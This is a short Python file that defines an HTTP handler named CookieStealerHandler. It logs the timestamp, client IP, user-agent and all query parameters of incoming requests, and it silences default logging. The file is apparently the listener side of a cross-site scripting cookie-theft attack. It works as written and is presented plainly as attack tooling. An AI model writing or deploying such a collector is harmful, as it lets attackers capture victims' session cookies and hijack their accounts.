from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime


class CookieStealerHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        query_components = parse_qs(urlparse(self.path).query)
        print()
        print(
            f"{datetime.now().strftime('%Y-%m-%d %I:%M %p')} - \
            {self.client_address[0]}\t{self.headers['user-agent']}"
        )
        print("-------------------" * 3)
        for k, v in query_components.items():
            print(k.strip(), "\t\t", v)
        return

    def log_message(self, _format, *args):
        return
